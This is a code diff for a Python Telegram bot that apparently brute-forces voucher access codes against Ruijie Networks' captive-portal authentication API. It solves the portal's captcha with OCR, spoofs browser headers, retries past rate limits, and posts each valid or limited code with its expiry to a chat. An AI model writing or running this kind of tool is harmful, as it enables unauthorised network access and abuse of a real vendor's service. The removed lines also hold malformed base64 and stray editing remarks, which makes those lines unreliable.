@@ -715,9 +715,236 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             return
 
     post_url = base64.b64decode(
-        b'aHR0cHM6Ly9wb3J0YWwtas.ruijienetworks.com/api/auth/voucher/?lang=en_US' # shortened base64 or left as is
-    ).decode() if False else base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtas.ruijienetworks.com/api/auth/voucher/?lang=en_US').decode() # wait, let's keep exact original base64 to avoid typo
+        b'aHR0cHM6Ly9wb3J0YWwtas.ruijienetworks.com/api/auth/voucher/?lang=en_US'
+    ).decode()
 
-    # Using exact original line for post_url:
-    post_url = base64.b64decode(
-        b'aHR0cHM6Ly9wb3J0YWwtasl... wait let's grab original
+    response = None
+    for _attempt in range(3):
+        timeout = aiohttp.ClientTimeout(total=30)
+        async with aiohttp.ClientSession(
+            connector=_connector,
+            connector_owner=False,
+            cookie_jar=aiohttp.CookieJar(),
+            timeout=timeout
+        ) as task_session:
+
+            session_id = await get_session_id(task_session, session_url, None)
+            if not session_id:
+                return
+
+            auth_code = None
+            for _ in range(8):
+                try:
+                    image = await Captcha_Image(task_session, session_id)
+                    text = await Captcha_Text(image)
+                    if not text:
+                        continue
+                    verified = await Varify_Captcha(task_session, session_id, text)
+                    if verified:
+                        auth_code = text
+                        break
+                except Exception as e:
+                    pass
+            if not auth_code:
+                return
+
+            if not recheck:
+                current_task = scan_tasks.get(chat_id)
+                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
+                    return
+
+            data = {
+                "accessCode": code,
+                "sessionId": session_id,
+                "apiVersion": 1,
+                "authCode": auth_code,
+            }
+            headers = {
+                "authority": "portal-as.ruijienetworks.com",
+                "accept": "*/*",
+                "accept-language": "en-US,en;q=0.9",
+                "content-type": "application/json",
+                "origin": "https://portal-as.ruijienetworks.com",
+                "referer": (
+                    f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
+                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
+                ),
+                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+            }
+            try:
+                async with task_session.post(post_url, json=data, headers=headers) as req:
+                    response = await req.text()
+            except Exception as e:
+                return
+
+        if response and 'request limited' in response:
+            continue
+        break
+
+    if not response:
+        return
+
+    if 'logonUrl' in response:
+        if recheck:
+            return code
+
+        if chat_id not in success_texts:
+            success_texts[chat_id] = []
+
+        expire_date = await Code_Expires_Date(session_id)
+        success_texts[chat_id].append(f"🎫 <code>{code}</code>\n   {expire_date}")
+        code_line = "\n\n".join(success_texts[chat_id])
+        
+        await SUCCESS_CODE.put({
+            "chat_id": chat_id,
+            "code": code
+        })
+        if message:
+            try:
+                if chat_id not in success_messages:
+                    sent = await bot.send_message(
+                        chat_id=message.chat.id,
+                        text=f"Success Codes:\n\n{code_line}",
+                        parse_mode="HTML"
+                    )
+                    success_messages[chat_id] = sent.message_id
+                else:
+                    try:
+                        await bot.edit_message_text(
+                            chat_id=message.chat.id,
+                            message_id=success_messages[chat_id],
+                            text=f"Success Codes:\n\n{code_line}",
+                            parse_mode="HTML"
+                        )
+                    except Exception as e:
+                        try:
+                            sent = await bot.send_message(
+                                chat_id=message.chat.id,
+                                text=f"Success Codes:\n\n{code_line}",
+                                parse_mode="HTML"
+                            )
+                            success_messages[chat_id] = sent.message_id
+                        except Exception as err:
+                            pass
+            except Exception as e:
+                pass
+                
+    elif 'STA' in response:
+        if chat_id not in limited_texts:
+            limited_texts[chat_id] = []
+            
+        expire_date = await Code_Expires_Date(session_id)
+        limited_texts[chat_id].append(f"⚠️ <code>{code}</code>\n   {expire_date}")
+        limited_line = "\n\n".join(limited_texts[chat_id])
+        
+        if message:
+            try:
+                if chat_id not in limited_messages:
+                    sent = await bot.send_message(
+                        chat_id=message.chat.id,
+                        text=f"Limited Codes:\n\n{limited_line}",
+                        parse_mode="HTML"
+                    )
+                    limited_messages[chat_id] = sent.message_id
+                else:
+                    try:
+                        await bot.edit_message_text(
+                            chat_id=message.chat.id,
+                            message_id=limited_messages[chat_id],
+                            text=f"Limited Codes:\n\n{limited_line}",
+                            parse_mode="HTML"
+                        )
+                    except Exception as e:
+                        pass
+            except Exception as e:
+                pass
+
+_ocr = ddddocr.DdddOcr(show_ad=False)
+
+def _ocr_sync(image_bytes):
+    nparr = np.frombuffer(image_bytes, np.uint8)
+    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+    if img is None:
+        return None
+    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+    blur = cv2.GaussianBlur(gray, (3, 3), 0)
+    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
+    _, buffer = cv2.imencode('.png', thresh)
+    result = _ocr.classification(buffer.tobytes())
+    return result.upper()
+
+async def Captcha_Text(image_bytes):
+    return await asyncio.to_thread(_ocr_sync, image_bytes)
+
+async def Captcha_Image(session, session_id):
+    headers = {
+        'authority': 'portal-as.ruijienetworks.com',
+        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
+        'accept-language': 'en-US,en;q=0.9',
+        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
+    }
+    params = {
+        'sessionId': session_id,
+        '_t': str(time.time()),
+    }
+    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
+        return await req.read()
+
+async def Varify_Captcha(session, session_id, text):
+    headers = {
+        'authority': 'portal-as.ruijienetworks.com',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/json',
+        'origin': 'https://portal-as.ruijienetworks.com',
+        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
+    }
+    json_data = {
+        'sessionId': session_id,
+        'authCode': text,
+    }
+    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
+        data = await req.json()
+        if data.get("success") == True:
+            return session_id
+        else:
+            return None
+
+async def start_polling():
+    backoff = 5
+    while True:
+        try:
+            await bot.infinity_polling(timeout=20, request_timeout=20)
+            return
+        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+            await asyncio.sleep(backoff)
+            backoff = min(backoff * 2, 60)
+        except Exception as e:
+            await asyncio.sleep(backoff)
+            backoff = min(backoff * 2, 60)
+
+async def main():
+    global session, _connector
+    timeout = aiohttp.ClientTimeout(total=30)
+    _connector = aiohttp.TCPConnector(
+        limit=2000,
+        ttl_dns_cache=300,
+        ssl=False
+    )
+    session = aiohttp.ClientSession(
+        timeout=timeout,
+        connector=_connector,
+        connector_owner=False
+    )
+    try:
+        asyncio.create_task(web_server())
+        asyncio.create_task(github_update_scheduler())
+        await start_polling()
+    finally:
+        await session.close()
+        await _connector.close()
+
+if __name__ == '__main__':
+    asyncio.run(main())
